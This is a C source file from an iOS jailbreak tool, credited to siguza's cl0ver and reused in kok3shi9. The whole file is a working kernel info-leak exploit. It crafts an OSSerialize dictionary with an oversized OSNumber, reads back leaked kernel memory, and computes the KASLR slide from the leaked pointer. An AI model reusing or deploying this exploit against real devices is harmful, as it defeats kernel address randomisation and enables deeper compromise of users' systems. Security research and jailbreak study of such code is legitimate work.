// siguza's cl0ver
// this file was also used kok3shi9

#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>

#include <plog.h>
#include <common.h>
#include <io.h>

static addr_t get_kernel_anchor(void)
{
    static addr_t anchor = 0;
    if(anchor == 0)
    {
        size_t bufsize = 0x80;
        uint32_t buflen = (uint32_t)bufsize;
        const char key[4] = "lol";
        uint32_t dict[7] =
        {
            kOSSerializeMagic,                                              // Magic
            kOSSerializeEndCollection | kOSSerializeDictionary | 2,         // Dictionary with 2 entries
            kOSSerializeSymbol | 4,                                         // Key symbol with 4 bytes
            *((uint32_t*)key),                                              // "lol", used later with IORegistryEntryGetProperty
            kOSSerializeEndCollection | kOSSerializeNumber | (8 * bufsize), // number of bits
            0x69696969,                                                     // Need sizeof(long long) bytes to pass checks
            0x69696969,
        };
        
        size_t *buf = malloc(bufsize);
        if(buf == NULL)
        {
            return -1;
        }
        
        dict_get_bytes(dict, sizeof(dict), key, buf, &buflen);
        
        /* !__LP64__ */
        anchor = buf[9];
        /* !__LP64__ */
        
        free(buf);
    }
    
    return anchor;
}

addr_t get_kernel_slide(void)
{
    static addr_t kslide = 0;
    if(kslide == 0)
    {
        LOG("using info leak to get kernel slide...");
        addr_t kanchor = get_kernel_anchor();
        LOG("kernel anchor: " ADDR, kanchor);
        
        // unsafe breaking kaslr slide
        /* !__LP64__ */
        kslide = ((kanchor & 0xFFF00000) + 0x1000) - KERNEL_BASE_ADDRESS;
        /* !__LP64__ */
        
        LOG("kernel slide: " ADDR, kslide);
        
        if(kslide % 0x100000 != 0)
        {
            ERR("kernel slide is not a multiple of 0x100000");
            kslide = 0;
            return 0;
        }
    }
    
    return kslide;
}
